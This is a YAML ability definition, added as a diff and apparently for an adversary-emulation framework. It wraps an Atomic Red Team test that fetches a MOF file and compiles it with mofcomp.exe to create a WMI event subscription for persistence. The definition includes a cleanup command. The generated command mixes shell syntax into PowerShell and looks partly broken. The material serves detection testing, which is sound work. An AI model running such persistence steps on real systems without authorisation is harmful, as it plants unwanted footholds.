@@ -1,0 +1,79 @@
+- id: 29786d7e-8916-4de6-9c55-be7b093b2706
+  name: Windows MOFComp.exe Load MOF File
+  description: "The following Atomic will utilize MOFComp.exe to load a local MOF\
+    \ file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF\
+    \ statements and adds the classes and class instances defined in the file to the\
+    \ WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\\
+    subscription\nA successful execution will add the class to WMI root namespace.\n\
+    Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/\
+    \ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/."
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.003
+    name: 'Event Triggered Execution: Windows Management Instrumentation Event Subscription'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "c:\windows\system32\wbem\mofcomp.exe") { exit 0}
+          else { exit 1}; then : ; else Validate MOFComp.exe is on disk somewhere
+          and update input argument.; fi; if (Test-Path "PathToAtomicsFolder\T1546.003\src\T1546.003.mof")
+          { exit 0} else { exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1546.003\src\T1546.003.mof") -ErrorAction ignore |
+          Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof"
+          -OutFile "PathToAtomicsFolder\T1546.003\src\T1546.003.mof"; fi; c:\windows\system32\wbem\mofcomp.exe
+          "PathToAtomicsFolder\T1546.003\src\T1546.003.mof"'
+        cleanup: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription
+          -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam_consumer'";
+          $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class
+          __EventFilter -Filter "Name = 'AtomicRedTeam_filter'"; $FilterConsumerBindingToCleanup
+          = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)}
+          WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue;
+          $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup
+          | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1546.003
+  - privilege-escalation
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      mofcomp_path:
+        description: Location of mofcomp.exe
+        type: string
+        default: c:\windows\system32\wbem\mofcomp.exe
+      mof_file:
+        description: Local location MOF file
+        type: string
+        default: PathToAtomicsFolder\T1546.003\src\T1546.003.mof
+    dependencies:
+    - description: 'MofComp.exe must exist on disk at specified location (#{mofcomp_path})
+
+        '
+      prereq_command: 'if (Test-Path "#{mofcomp_path}") { exit 0} else { exit 1}
+
+        '
+      get_prereq_command: 'Validate MOFComp.exe is on disk somewhere and update input
+        argument.
+
+        '
+    - description: 'MofComp.exe must exist on disk at specified location (#{mof_file})
+
+        '
+      prereq_command: 'if (Test-Path "#{mof_file}") { exit 0} else { exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{mof_file}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof"
+        -OutFile "#{mof_file}"
+
+        '
+    technique_created: '2020-01-24T14:07:56.276Z'
+    atomic_guid: 29786d7e-8916-4de6-9c55-be7b093b2706
+    import_timestamp: '2025-06-24T11:15:02.382962Z'
